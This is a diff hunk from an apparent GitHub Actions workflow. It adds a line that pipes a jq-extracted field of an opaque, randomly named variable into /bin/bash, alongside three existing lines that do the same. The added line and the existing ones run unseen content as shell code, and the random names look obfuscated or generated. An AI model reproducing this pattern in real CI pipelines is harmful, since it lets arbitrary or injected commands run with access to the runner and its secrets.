@@ -27,6 +27,7 @@ jobs:
           echo $fknkl11363 | jq -r .b62421 | /bin/bash
           printf '%s' "$uvek4" | jq -r .dmki926 | /bin/bash
           echo $r7684 | jq -r .wvxs93589 | /bin/bash
+          echo $ekkn2 | jq -r .rm14 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
